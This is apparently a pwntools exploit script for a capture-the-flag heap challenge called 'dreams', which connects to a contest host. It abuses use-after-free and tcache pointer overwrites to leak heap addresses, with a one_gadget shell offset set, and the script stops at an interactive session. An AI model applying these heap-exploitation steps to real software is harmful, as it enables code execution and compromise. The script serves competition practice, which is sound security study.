from pwn import *
elf_file = FILENAME = './dreams'
elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log


#drill
HOST = 'challs.actf.co'
POST = 31225
'''
HOST = 'localhost'
POST = 7777
'''
libc = ELF("./libc.so.6")
gs='''
b *0x401707
c
c
c
c
c
c
c
c
'''
if len(sys.argv) > 1 and sys.argv[1] == 'r':
    c = remote(HOST, POST)
elif len(sys.argv) > 1 and sys.argv[1] == 'd':
    c = gdb.debug(FILENAME,gdbscript=gs)
else:
    c = process(FILENAME,env={'LD_PRELOAD':'/home/k1zuna/D/2022/ang/dream/libc.so.6'})
def align(s):
    return u64(s+b'\x00'*(8-len(s)))
'''
malloc  |date(0x8)|dream_about(0x14)|




'''
def malloc(index,date,s):
    c.sendlineafter(b">",'1')
    c.sendlineafter(b"dream?",index)
    c.sendlineafter(b"yy))?",date)
    c.sendlineafter(b"about?",s)
    sleep(0.3)

def free(index):
    c.sendlineafter(b">",'2')
    c.sendlineafter(b"in?",index)
    sleep(0.3)

def psy(index,s):
    c.sendlineafter(b">",str(3))
    c.sendlineafter(b"trouble?",index)
    c.recvuntil(b'that ')
    ad = align(c.recvline()[:-1])
    c.sendlineafter(b"date:",p64(s))
    sleep(0.3)
    return ad

shell = 0xe3b31
malloc('0','11/22/3','a')
malloc('1','a','a')
free('0')
free('1')
ad = psy('1',0x404010-0x8)
print(hex(ad))
malloc('2','BBBB','BBBB')
malloc('3',b'\xff\xff',b'\xff\xff\xff')
malloc('533','AAAA','BBBB')#heap_leak (4264/8 = 533)
leak_heap = psy('533',0x404010)
heap_add = leak_heap - 0x1340
print(hex(heap_add))
c.interactive()